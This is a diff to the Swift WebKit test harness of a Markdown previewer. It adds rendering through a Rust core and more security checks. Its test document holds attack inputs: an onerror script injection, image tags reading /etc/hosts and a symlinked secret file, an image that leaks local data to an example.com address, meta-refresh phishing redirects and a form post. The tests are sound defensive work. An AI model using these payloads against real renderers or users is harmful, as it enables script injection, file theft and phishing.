@@ -3,7 +3,7 @@ import WebKit
 
 // Peekdown 테스트 하네스. src/MdairRender.swift와 함께 컴파일한다(tests/run.sh 참고).
 //   harness unit                          렌더러·리더 단위 테스트
-//   harness webkit                        WKWebView에 띄워 보는 보안·동작 테스트
+//   harness webkit [--core <rust harness>] WKWebView에 띄워 보는 보안·동작 테스트. --core면 Rust(core/)가 만든 페이지를 띄운다
 //   harness spec <cases.json> <out.json>  스펙 예제를 렌더링해 저장(비교는 tests/spec/spec.py)
 //   harness bundle <path>                 TextBundle/TextPack을 열어 제목과 이미지 인라인 결과를 출력
 
@@ -215,7 +215,24 @@ func json(_ s: String) -> [String: Any] {
     (try? JSONSerialization.jsonObject(with: Data(s.utf8))) as? [String: Any] ?? [:]
 }
 
-func webkitTests() {
+/// 마크다운으로 완성 페이지를 만든다. corePath가 있으면 Rust 하네스(`harness page [base-dir]`)에 맡긴다.
+func makePage(_ markdown: String, baseDir: String?, corePath: String?) -> String {
+    guard let corePath else { return MdairHTML.page(forMarkdown: markdown, baseDir: baseDir) }
+    let process = Process()
+    process.executableURL = URL(fileURLWithPath: corePath)
+    process.arguments = ["page"] + (baseDir.map { [$0] } ?? [])
+    let input = Pipe(), output = Pipe()
+    process.standardInput = input
+    process.standardOutput = output
+    try! process.run()
+    input.fileHandleForWriting.write(Data(markdown.utf8))
+    try! input.fileHandleForWriting.close()
+    let data = output.fileHandleForReading.readDataToEndOfFile()
+    process.waitUntilExit()
+    return String(decoding: data, as: UTF8.self)
+}
+
+func webkitTests(corePath: String?) {
     _ = NSApplication.shared
     let dir = makeTempDir()
     defer { try? FileManager.default.removeItem(at: dir) }
@@ -223,7 +240,10 @@ func webkitTests() {
     for name in ["pic.png", "스크린 샷.png"] { try! png.write(to: dir.appendingPathComponent(name)) }
     try! "DUMMY-SECRET".write(to: dir.appendingPathComponent("secret.txt"), atomically: true, encoding: .utf8)
     try! FileManager.default.createSymbolicLink(at: dir.appendingPathComponent("logo.png"), withDestinationURL: dir.appendingPathComponent("secret.txt"))
-    check(MdairHTML.mermaidScript != nil, "mermaid.min.js가 실행 파일 옆에 있음(tests/run.sh가 복사)")
+    func page(_ markdown: String, baseDir: String? = nil) -> String { makePage(markdown, baseDir: baseDir, corePath: corePath) }
+    if corePath == nil {
+        check(MdairHTML.mermaidScript != nil, "mermaid.min.js가 실행 파일 옆에 있음(tests/run.sh가 복사)")
+    }
 
     print("[webkit] 스크립트·파일 인라인·Mermaid")
     let attack = """
@@ -234,9 +254,11 @@ func webkitTests() {
     ![a](x" onerror="window.pwned = (window.pwned || '') + 'attr;')
     <img id="secret" src="secret.txt">
     <img id="hosts" src="/etc/hosts">
-    <img id="link" src="logo.png">
-    <img id="pic" src="pic.png">
+    <img id="raw" src="pic.png">
+    <img id="exfil" src='https://example.com/leak?d= <img src="pic.png" '>
     <link rel="stylesheet" href="data:text/css,body%7Bcolor:rgb(1,2,3)!important%7D">
+
+    ![link](logo.png) ![pic](pic.png)
 
     ![한글 이름](스크린%20샷.png)
 
@@ -245,42 +267,49 @@ func webkitTests() {
       A-->B
     ```
     """
-    let (page, _, _) = runPage(MdairHTML.page(forMarkdown: attack, baseDir: dir.path), baseURL: dir, """
+    let (result, _, _) = runPage(page(attack, baseDir: dir.path), baseURL: dir, """
     JSON.stringify({
       pwned: window.pwned || null,
       mermaid: document.querySelectorAll('.mermaid svg').length,
       secret: document.getElementById('secret').getAttribute('src'),
       hosts: document.getElementById('hosts').getAttribute('src'),
-      link: document.getElementById('link').getAttribute('src').slice(0, 5),
-      pic: document.getElementById('pic').getAttribute('src').slice(0, 14),
+      link: [...document.images].filter(i => i.alt === 'link').map(i => i.getAttribute('src').slice(0, 5))[0] || null,
+      pic: [...document.images].filter(i => i.alt === 'pic').map(i => i.getAttribute('src').slice(0, 14))[0] || null,
+      raw: document.getElementById('raw').getAttribute('src'),
+      exfil: document.getElementById('exfil').getAttribute('src').includes('data:'),
       korean: [...document.images].filter(i => i.alt === '한글 이름').map(i => i.getAttribute('src').slice(0, 14))[0] || null,
       color: getComputedStyle(document.body).color
     })
     """)
-    let r = json(page)
+    let r = json(result)
     check(r["pwned"] is NSNull, "주입한 스크립트·onerror·속성 탈출이 실행되지 않음", "\(r["pwned"] ?? "nil")")
-    check((r["mermaid"] as? Int) == 1, "Mermaid가 그려짐", page)
+    check((r["mermaid"] as? Int) == 1, "Mermaid가 그려짐", result)
     check((r["secret"] as? String) == "secret.txt" && (r["hosts"] as? String) == "/etc/hosts", "이미지가 아닌 파일은 인라인하지 않음")
     check((r["link"] as? String) == "logo.", "비밀 파일을 가리키는 이미지 이름의 심볼릭 링크는 인라인하지 않음", "\(r["link"] ?? "nil")")
     check((r["pic"] as? String) == "data:image/png", "정상 이미지는 인라인")
     check((r["korean"] as? String) == "data:image/png", "한글·공백 파일 이름 이미지 인라인")
+    if corePath != nil {
+        // Rust는 마크다운 이미지만 인라인한다. Swift 렌더러는 raw HTML까지 정규식으로 바꿔 아래 둘에 걸린다
+        check((r["raw"] as? String) == "pic.png", "raw HTML <img>는 인라인하지 않음", "\(r["raw"] ?? "nil")")
+        check((r["exfil"] as? Bool) == false, "속성값 안에 숨긴 <img src>로 로컬 이미지를 원격 주소에 싣지 못함")
+    }
     check((r["color"] as? String) != "rgb(1, 2, 3)", "문서 속 외부 스타일시트는 CSP로 막힘", "\(r["color"] ?? "nil")")
 
     print("[webkit] 문서가 창을 다른 페이지로 옮기지 못함")
     for (label, body) in [("meta refresh 0초", "<meta http-equiv=\"refresh\" content=\"0;url=https://example.com/phish\">"),
                           ("meta refresh 1초", "<meta http-equiv=\"refresh\" content=\"1;url=https://example.com/phish\">"),
                           ("meta refresh data:", "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,x\">")] {
-        let (_, recorder, webView) = runPage(MdairHTML.page(body: render("# Doc\n\n\(body)\n")), baseURL: dir, settle: 2.0, "'ok'")
+        let (_, recorder, webView) = runPage(page("# Doc\n\n\(body)\n"), baseURL: dir, settle: 2.0, "'ok'")
         check(webView.url?.scheme == "file", "\(label): 원래 문서에 머묾", "\(webView.url?.absoluteString ?? "nil")")
         check(!recorder.blocked.isEmpty, "\(label): 이동을 막은 기록이 있음")
     }
-    let (_, formRecorder, formView) = runPage(MdairHTML.page(body: render("<form action=\"https://example.com/post\"><button id=\"b\">go</button></form>\n")),
+    let (_, formRecorder, formView) = runPage(page("<form action=\"https://example.com/post\"><button id=\"b\">go</button></form>\n"),
                                               baseURL: dir, before: "document.getElementById('b').click(); 1", "'ok'")
     check(formView.url?.scheme == "file", "폼 제출로 이동하지 않음", "\(formView.url?.absoluteString ?? "nil") \(formRecorder.blocked)")
 
     print("[webkit] 각주 링크는 문서 안에서 이동")
     let filler = (1...60).map { "Line \($0)." }.joined(separator: "\n\n")
-    let notes = MdairHTML.page(body: render("Claim.[^1]\n\n\(filler)\n\n[^1]: Note.\n"))
+    let notes = page("Claim.[^1]\n\n\(filler)\n\n[^1]: Note.\n")
     for (label, base) in [("파일 기준 주소", dir as URL?), ("about:blank", nil)] {
         let (state, _, _) = runPage(notes, baseURL: base, before: "document.querySelector('a[data-footnote-ref]').click(); 1",
                                     "JSON.stringify({hash: location.hash, y: scrollY})")
@@ -312,7 +341,7 @@ func bundleSummary(_ path: String) {
 let args = CommandLine.arguments
 switch args.count > 1 ? args[1] : "" {
 case "unit": unitTests(); finish()
-case "webkit": webkitTests(); finish()
+case "webkit": webkitTests(corePath: args.count > 3 && args[2] == "--core" ? args[3] : nil); finish()
 case "spec": specRender(args[2], args[3])
 case "bundle": bundleSummary(args[2])
 default:
